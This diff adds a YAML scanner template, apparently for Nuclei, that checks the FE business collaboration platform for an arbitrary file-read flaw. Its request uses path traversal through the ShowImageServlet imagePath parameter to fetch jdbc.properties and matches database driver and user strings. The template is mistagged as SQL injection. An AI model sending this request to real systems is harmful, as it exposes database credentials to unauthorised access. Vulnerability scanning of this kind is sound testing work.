@@ -1,0 +1,25 @@
+id: poc-yaml-fqhl--FE-business-assistance-platform-showimageservlet-file-read
+info:
+  name: 飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "com.microsoft.sqlserver.jdbc.SQLServerDriver"
+          - "mssql.jdbc.user="
+          - "edit database ip;odbc"
+      - type: regex
+        part: header
+        regex:
+          - "(?i)^content-type:\\s*image/.*$"
